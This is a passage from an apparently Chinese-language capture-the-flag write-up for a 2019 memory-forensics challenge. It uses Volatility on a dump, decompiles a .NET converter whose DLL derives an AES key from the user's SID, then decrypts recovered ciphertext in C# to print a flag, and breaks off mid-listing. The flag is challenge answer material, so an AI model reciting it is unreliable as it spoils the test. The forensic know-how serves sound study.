                  </span><br><span class=\"line\">0xfffffa800246e530 converter.exe          2308   2280     11      183      1      0 2019-08-21 05:52:25 UTC+0000                                 </span><br><span class=\"line\">0xfffffa800246fb00 converter.exe          2316   2280     10      152      1      0 2019-08-21 05:52:25 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8000e06b00 sppsvc.exe             2732    504      6      152      0      0 2019-08-21 05:54:09 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8000e0b060 svchost.exe            2760    504     12      376      0      0 2019-08-21 05:54:09 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8002443390 WmiPrvSE.exe           2976    640      8      142      0      0 2019-08-21 05:54:56 UTC+0000                                 </span><br></pre></td></tr></table></figure>\r\n<p>converter.exe似乎很扎眼。我们用procdump提出来。2308提出来大概8MB，而2316只有8KB。他俩似乎都是.Net的程序。而2308是可以直接运行的。我们用dotPeek反编译一下。2308的代码太大了，我们暂时不考虑。而2316.exe中有一段代码我们很感兴趣。</p>\r\n<figure class=\"highlight c#\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> someCrypto;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.ComponentModel;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Drawing;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.IO;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Text;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Windows.Forms;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">converter</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title\">Form1</span> : <span class=\"title\">Form</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">string</span> string_0 = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> MemoryStream ms = <span class=\"keyword\">new</span> MemoryStream(<span class=\"number\">800</span>);</span><br><span class=\"line\">    <span class=\"keyword\">private</span> IContainer components;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Button button;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> RichTextBox text;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Form1</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.InitializeComponent();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">Click_Button</span>(<span class=\"params\"><span class=\"keyword\">object</span> sender, EventArgs e</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>    &#123;</span><br><span class=\"line\">      Crypto crypto = <span class=\"keyword\">new</span> Crypto();</span><br><span class=\"line\">      crypto.function03();</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.string_0 = Convert.ToBase64String(crypto.function02(<span class=\"keyword\">this</span>.text.Text));</span><br><span class=\"line\">      crypto.Dispose();</span><br><span class=\"line\">      GC.Collect();</span><br><span class=\"line\">      GC.WaitForPendingFinalizers();</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.ms.Read(Encoding.ASCII.GetBytes(<span class=\"keyword\">this</span>.string_0), <span class=\"number\">0</span>, Encoding.ASCII.GetBytes(<span class=\"keyword\">this</span>.string_0).Length);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.text.Text = <span class=\"keyword\">this</span>.string_0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>其中用到了someCrypto？那我们用dlllist查一下2316用到的DLL。</p>\r\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">volatility dlllist -f flagconverter.dmp --profile&#x3D;Win7SP1x64 -p 2316</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6</span><br><span class=\"line\"></span><br><span class=\"line\">************************************************************************</span><br><span class=\"line\">converter.exe pid:   2316</span><br><span class=\"line\">Command line : C:\\Users\\ALLES\\Desktop\\3\\converter.exe </span><br><span class=\"line\">Service Pack 1</span><br><span class=\"line\"></span><br><span class=\"line\">Base                             Size          LoadCount LoadTime                       Path</span><br><span class=\"line\">------------------ ------------------ ------------------ ------------------------------ ----</span><br><span class=\"line\">0x0000000001090000             0x8000             0xffff 1970-01-01 00:00:00 UTC+0000   C:\\Users\\ALLES\\Desktop\\3\\converter.exe</span><br><span class=\"line\">0x0000000077aa0000           0x19f000             0xffff 1970-01-01 00:00:00 UTC+0000   C:\\Windows\\SYSTEM32\\ntdll.dll</span><br><span class=\"line\">0x000007fef5020000            0x6f000             0xffff 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\SYSTEM32\\MSCOREE.DLL</span><br><span class=\"line\">0x0000000077980000           0x11f000             0xffff 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\KERNEL32.dll</span><br><span class=\"line\">0x000007fefd770000            0x6a000             0xffff 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\KERNELBASE.dll</span><br><span class=\"line\">0x000007feff5a0000            0xdb000                0xe 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\ADVAPI32.dll</span><br><span class=\"line\">0x000007feff680000            0x9f000               0x68 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\msvcrt.dll</span><br><span class=\"line\">0x000007feff4e0000            0x1f000               0x3b 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\SYSTEM32\\sechost.dll</span><br><span class=\"line\">0x000007feffb90000           0x12d000               0x2b 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\RPCRT4.dll</span><br><span class=\"line\">0x000007fef4f80000            0x9c000                0x1 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoreei.dll</span><br><span class=\"line\">0x000007fefd9b0000            0x71000                0x9 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\SHLWAPI.dll</span><br><span class=\"line\">0x000007feff720000            0x67000               0x83 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\GDI32.dll</span><br><span class=\"line\">0x0000000077880000            0xfa000               0x87 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\USER32.dll</span><br><span class=\"line\">0x000007feff170000             0xe000               0x1f 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\LPK.dll</span><br><span class=\"line\">0x000007feffcc0000            0xcb000               0x1f 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\USP10.dll</span><br><span class=\"line\">0x000007feff140000            0x2e000                0x3 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\IMM32.DLL</span><br><span class=\"line\">0x000007feff030000           0x109000                0x3 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\MSCTF.dll</span><br><span class=\"line\">0x000007fefc830000             0xc000                0x2 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\VERSION.dll</span><br><span class=\"line\">0x000007fef33f0000           0x9a0000                0x3 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorwks.dll</span><br><span class=\"line\">0x0000000074f00000            0xc9000                0x4 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\WinSxS\\amd64_microsoft.vc80.crt_1fc8b3b9a1e18e3b_8.0.50727.4940_none_88df89932faf0bf6\\MSVCR80.dll</span><br><span class=\"line\">0x000007fefdbb0000           0xd8a000                0x2 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\shell32.dll</span><br><span class=\"line\">0x000007feff790000           0x1ff000                0x9 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\ole32.dll</span><br><span class=\"line\">0x000007fefd5f0000             0xf000                0x1 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\system32\\profapi.dll</span><br><span class=\"line\">0x000007fef2440000           0xee3000                0x1 2019-08-21 05:52:25 UTC+0000   C:\\Windows\\assembly\\NativeImages_v2.0.50727_64\\mscorlib\\a83e2c5a3237fc549e8ccb54585ff2c1\\mscorlib.ni.dll</span><br><span class=\"line\">0x000007fefd3f0000             0xf000                0x2 2019-08-21 05:52:26 UTC+0000   C:\\Windows\\system32\\CRYPTBASE.dll</span><br><span class=\"line\">0x000007fefbdb0000            0x56000                0x4 2019-08-21 05:52:26 UTC+0000   C:\\Windows\\system32\\uxtheme.dll</span><br><span class=\"line\">0x000007fef17c0000           0x183000                0x1 2019-08-21 05:52:26 UTC+0000   C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorjit.dll</span><br><span class=\"line\">0x000007fef0d80000           0xa33000                0x1 2019-08-21 05:52:26 UTC+0000   C:\\Windows\\assembly\\NativeImages_v2.0.50727_64\\System\\9bb115aedc44c70bb3f6cf4ac4f3f9cb\\System.ni.dll</span><br><span class=\"line\">0x000007fef0b40000           0x239000                0x1 2019-08-21 05:52:26 UTC+0000   C:\\Windows\\assembly\\NativeImages_v2.0.50727_64\\System.Drawing\\24637f09c78822f6e1b3b531489f223f\\System.Drawing.ni.dll</span><br><span class=\"line\">0x000007feefaa0000          0x1098000                0x1 2019-08-21 05:52:26 UTC+0000   C:\\Windows\\assembly\\NativeImages_v2.0.50727_64\\System.Windows.Forms\\6c3df040b081b732b934702fa8149535\\System.Windows.Forms.ni.dll</span><br><span class=\"line\">0x000007feec5b0000            0x9e000                0x1 2019-08-21 05:52:26 UTC+0000   C:\\Windows\\system32\\RichEd20.DLL</span><br><span class=\"line\">0x000007fefbb90000           0x218000                0x2 2019-08-21 05:52:26 UTC+0000   C:\\Windows\\WinSxS\\amd64_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.7601.24280_none_145e10148b8de48e\\gdiplus.dll</span><br><span class=\"line\">0x000007fefb890000            0x18000                0x1 2019-08-21 05:52:26 UTC+0000   C:\\Windows\\system32\\dwmapi.dll</span><br><span class=\"line\">0x000007fefc130000           0x1f4000                0x3 2019-08-21 05:52:26 UTC+0000   C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.18837_none_fa3b1e3d17594757\\comctl32.DLL</span><br><span class=\"line\">0x000007fefdad0000            0xda000                0x1 2019-08-21 05:52:26 UTC+0000   C:\\Windows\\system32\\OLEAUT32.DLL</span><br><span class=\"line\">0x000007fefcde0000            0x18000                0x1 2019-08-21 05:54:38 UTC+0000   C:\\Windows\\system32\\CRYPTSP.dll</span><br><span class=\"line\">0x000007fefcae0000            0x47000                0x1 2019-08-21 05:54:38 UTC+0000   C:\\Windows\\system32\\rsaenh.dll</span><br><span class=\"line\">0x000007fefd540000            0x14000                0x1 2019-08-21 05:54:38 UTC+0000   C:\\Windows\\system32\\RpcRtRemote.dll</span><br><span class=\"line\">0x0000000074ef0000             0x8000                0x1 2019-08-21 05:54:38 UTC+0000   C:\\Users\\ALLES\\Desktop\\3\\Crypto.dll</span><br><span class=\"line\">0x000007fefcf30000            0x22000                0x1 2019-08-21 05:54:38 UTC+0000   C:\\Windows\\system32\\bcrypt.dll</span><br></pre></td></tr></table></figure>\r\n<p>其中确实有一个Crypto.dll。我们用dlldump导出来后发现还是个.Net的应用程序集。继续拖到dotPeek。</p>\r\n<figure class=\"highlight c#\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> Microsoft.Win32.SafeHandles;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.IO;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Runtime.InteropServices;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Security.Cryptography;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Security.Principal;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Text;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">someCrypto</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title\">Crypto</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> SafeHandle handle = (SafeHandle) <span class=\"keyword\">new</span> SafeFileHandle(IntPtr.Zero, <span class=\"literal\">true</span>);</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">byte</span>[] byte_0;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">byte</span>[] byte_1;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">bool</span> disposed;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">Dispose</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.Dispose(<span class=\"literal\">true</span>);</span><br><span class=\"line\">      GC.SuppressFinalize((<span class=\"keyword\">object</span>) <span class=\"keyword\">this</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">virtual</span> <span class=\"keyword\">void</span> <span class=\"title\">Dispose</span>(<span class=\"params\"><span class=\"keyword\">bool</span> disposing</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.disposed)</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (disposing)</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.handle.Dispose();</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.disposed = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> SymmetricAlgorithm <span class=\"title\">function01</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>    &#123;</span><br><span class=\"line\">      RijndaelManaged rijndaelManaged = <span class=\"keyword\">new</span> RijndaelManaged();</span><br><span class=\"line\">      rijndaelManaged.KeySize = <span class=\"number\">256</span>;</span><br><span class=\"line\">      rijndaelManaged.IV = <span class=\"keyword\">this</span>.byte_1;</span><br><span class=\"line\">      rijndaelManaged.Key = <span class=\"keyword\">this</span>.byte_0;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> (SymmetricAlgorithm) rijndaelManaged;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">byte</span>[] <span class=\"title\">function02</span>(<span class=\"params\"><span class=\"keyword\">string</span> string_0</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>    &#123;</span><br><span class=\"line\">      SymmetricAlgorithm symmetricAlgorithm = <span class=\"keyword\">this</span>.function01();</span><br><span class=\"line\">      MemoryStream memoryStream = <span class=\"keyword\">new</span> MemoryStream();</span><br><span class=\"line\">      CryptoStream cryptoStream = <span class=\"keyword\">new</span> CryptoStream((Stream) memoryStream, symmetricAlgorithm.CreateEncryptor(), CryptoStreamMode.Write);</span><br><span class=\"line\">      <span class=\"keyword\">byte</span>[] bytes = <span class=\"keyword\">new</span> UnicodeEncoding().GetBytes(string_0.PadRight(string_0.Length % <span class=\"number\">8</span>, <span class=\"keyword\">char</span>.MinValue));</span><br><span class=\"line\">      cryptoStream.Write(bytes, <span class=\"number\">0</span>, bytes.Length);</span><br><span class=\"line\">      cryptoStream.FlushFinalBlock();</span><br><span class=\"line\">      memoryStream.Position = <span class=\"number\">0L</span>;</span><br><span class=\"line\">      <span class=\"keyword\">byte</span>[] array = memoryStream.ToArray();</span><br><span class=\"line\">      string_0 = (<span class=\"keyword\">string</span>) <span class=\"literal\">null</span>;</span><br><span class=\"line\">      cryptoStream.Close();</span><br><span class=\"line\">      memoryStream.Close();</span><br><span class=\"line\">      GC.Collect();</span><br><span class=\"line\">      GC.WaitForPendingFinalizers();</span><br><span class=\"line\">      <span class=\"keyword\">return</span> array;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">function03</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">byte</span>[] binaryForm = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">28</span>];</span><br><span class=\"line\">      WindowsIdentity.GetCurrent().User.GetBinaryForm(binaryForm, <span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.byte_1 = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">16</span>];</span><br><span class=\"line\">      Array.Copy((Array) binaryForm, <span class=\"number\">0</span>, (Array) <span class=\"keyword\">this</span>.byte_1, <span class=\"number\">0</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.byte_0 = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">32</span>];</span><br><span class=\"line\">      Array.Copy((Array) binaryForm, binaryForm.Length - <span class=\"number\">16</span>, (Array) <span class=\"keyword\">this</span>.byte_0, <span class=\"number\">0</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">      Array.Copy((Array) binaryForm, binaryForm.Length - <span class=\"number\">16</span>, (Array) <span class=\"keyword\">this</span>.byte_0, <span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>好了，加密函数有了。那么我们要找到的密文呢？注意到2316主程序使用了Base64进行加密。那我们应该去寻找Base64字符串。后来我们在clipboard那里翻出来一段Base64，但很不幸的，这个是Flag1的Base64。然后我们大胆猜测一下2308和2316的内存中应该还残留数据，这次我们用memdump命令。导出来后grep \"=\"，果然发现一串：<code>ZuwJUgfmKzIMbo4F8agPy1MPLq+r7cAlDLowY+RT2wgp1uifc2TXeNH4bvbb2VqfK6r77SPHFrrMYR+GMGv8JGS87Tiybyi4LNNHQWnTR8LlGlSeHWWA9pydAXuJjSk8FzUFbqHOKqHc+bCtJ/4K2Q==</code>，那我们来看一下Crypto.dll的代码逆向推这段密文吧。</p>\r\n<p>function03()主要是获取到了当前登录用户的SID，转成二进制形式，然后填充了两个数组。而function02()使用AES进行加密，将两个数组分别用做IV和Key。</p>\r\n<p>加密算法已知，下一步是获得用户的SID。这个可以通过Volatility的getsids完成。<code>converter.exe (2316): S-1-5-21-2947568794-2193893069-2968809547-1000 (ALLES)</code>。下面是写程序解密了。首先拿到AES的Key和IV，以及要知道默认的加密方式。这个就直接用C#好了，省得再转。</p>\r\n<figure class=\"highlight c#\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Collections.Generic;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Linq;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Security.Principal;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Text;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Threading.Tasks;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">ConsoleApp1</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title\">Program</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">static</span> <span class=\"keyword\">byte</span>[] byte_1;</span><br><span class=\"line\">        <span class=\"keyword\">static</span> <span class=\"keyword\">byte</span>[] byte_0;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"><span class=\"keyword\">string</span>[] args</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">byte</span>[] binaryForm = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">28</span>];</span><br><span class=\"line\">            SecurityIdentifier a=<span class=\"keyword\">new</span> SecurityIdentifier(<span class=\"string\">&quot;S-1-5-21-2947568794-2193893069-2968809547-1000&quot;</span>);</span><br><span class=\"line\">            a.GetBinaryForm(binaryForm, <span class=\"number\">0</span>);</span><br><span class=\"line\">            byte_1 = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">16</span>];</span><br><span class=\"line\">            Array.Copy((Array)binaryForm, <span class=\"number\">0</span>, (Array)byte_1, <span class=\"number\">0</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">            byte_0 = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">32</span>];</span><br><span class=\"line\">            Array.Copy((Array)binaryForm, binaryForm.Length - <span class=\"number\">16</span>, (Array)byte_0, <span class=\"number\">0</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">            Array.Copy((Array)binaryForm, binaryForm.Length - <span class=\"number\">16</span>, (Array)byte_0, <span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">            Console.WriteLine(Convert.ToBase64String(byte_0));</span><br><span class=\"line\">            Console.WriteLine(Convert.ToBase64String(byte_1));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>得到byte_0的Base64：<code>mlSwr80mxIJLcPSw6AMAAJpUsK/NJsSCS3D0sOgDAAA=</code>，byte_1的Base64：<code>AQUAAAAAAAUVAAAAmlSwrw==</code>。同时拿到AES的加密方式为CBC。下面就是解密了。完整程序如下（AES解密是从<a href=\"https://docs.microsoft.com/zh-cn/dotnet/api/system.security.cryptography.rijndaelmanaged?view=netframework-4.8\">这里</a>抄的）：</p>\r\n<figure class=\"highlight c#\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Collections.Generic;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.IO;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Linq;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Security.Cryptography;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Security.Principal;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Text;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Threading.Tasks;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">ConsoleApp1</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title\">Program</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">static</span> <span class=\"keyword\">byte</span>[] byte_1;</span><br><span class=\"line\">        <span class=\"keyword\">static</span> <span class=\"keyword\">byte</span>[] byte_0;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"><span class=\"keyword\">string</span>[] args</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">byte</span>[] binaryForm = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">28</span>];</span><br><span class=\"line\">            SecurityIdentifier a=<span class=\"keyword\">new</span> SecurityIdentifier(<span class=\"string\">&quot;S-1-5-21-2947568794-2193893069-2968809547-1000&quot;</span>);</span><br><span class=\"line\">            a.GetBinaryForm(binaryForm, <span class=\"number\">0</span>);</span><br><span class=\"line\">            byte_1 = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">16</span>];</span><br><span class=\"line\">            Array.Copy((Array)binaryForm, <span class=\"number\">0</span>, (Array)byte_1, <span class=\"number\">0</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">            byte_0 = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">32</span>];</span><br><span class=\"line\">            Array.Copy((Array)binaryForm, binaryForm.Length - <span class=\"number\">16</span>, (Array)byte_0, <span class=\"number\">0</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">            Array.Copy((Array)binaryForm, binaryForm.Length - <span class=\"number\">16</span>, (Array)byte_0, <span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">            Console.WriteLine(Convert.ToBase64String(byte_0));</span><br><span class=\"line\">            Console.WriteLine(Convert.ToBase64String(byte_1));</span><br><span class=\"line\">            RijndaelManaged rijndaelManaged = <span class=\"keyword\">new</span> RijndaelManaged();</span><br><span class=\"line\">            rijndaelManaged.KeySize = <span class=\"number\">256</span>;</span><br><span class=\"line\">            Console.WriteLine(rijndaelManaged.Mode);</span><br><span class=\"line\">           \tConsole.WriteLine(DecryptStringFromBytes(Convert.FromBase64String(<span class=\"string\">&quot;ZuwJUgfmKzIMbo4F8agPy1MPLq+r7cAlDLowY+RT2wgp1uifc2TXeNH4bvbb2VqfK6r77SPHFrrMYR+GMGv8JGS87Tiybyi4LNNHQWnTR8LlGlSeHWWA9pydAXuJjSk8FzUFbqHOKqHc+bCtJ/4K2Q==&quot;</span>)));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">string</span> <span class=\"title\">DecryptStringFromBytes</span>(<span class=\"params\"><span class=\"keyword\">byte</span>[] cipherText</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>        &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Declare the string used to hold</span></span><br><span class=\"line\">            <span class=\"comment\">// the decrypted text.</span></span><br><span class=\"line\">            <span class=\"keyword\">string</span> plaintext = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// Create an RijndaelManaged object</span></span><br><span class=\"line\">            <span class=\"comment\">// with the specified key and IV.</span></span><br><span class=\"line\">            <span class=\"keyword\">using</span> (RijndaelManaged rijAlg = <span class=\"keyword\">new</span> RijndaelManaged())</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                rijAlg.Key = byte_0;</span><br><span class=\"line\">                rijAlg.IV = byte_1;</span><br><span class=\"line\">    </span><br><span class=\"line\">                <span class=\"comment\">// Create a decryptor to perform the stream transform.</span></span><br><span class=\"line\">                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);</span><br><span class=\"line\">    </span><br><span class=\"line\">                <span class=\"comment\">// Create the streams used for decryption.</span></span><br><span class=\"line\">                <span class=\"keyword\">using</span> (MemoryStream msDecrypt = <span class=\"keyword\">new</span> MemoryStream(cipherText))</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">using</span> (CryptoStream csDecrypt = <span class=\"keyword\">new</span> CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">using</span> (StreamReader srDecrypt = <span class=\"keyword\">new</span> StreamReader(csDecrypt))</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                            plaintext = srDecrypt.ReadToEnd();</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"keyword\">return</span> plaintext;</span><br><span class=\"line\">    </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>然后就拿到了我们的第二个Flag：ALLES{50m3_f0r3n51k_50m3_r3v3r51ng_4nd_50m3_c2ypt0_fun}。</p>\r\n<p>那么，第三个呢？进程看了，DLL看了，下面看一下截图吧。<img src=\"/2019/09/05/Chaos-Communication-Camp-2019-FlagConverter/session_1.WinSta0.Default.png\" class=\"\" title=\"桌面截图\">哦吼，explorer打开了一个看似乱码的路径？我们用filescan也能找到这个路径。<code>0x000000003e6645a0     16      0 R--r-d \\Device\\HarddiskVolume2\\Program 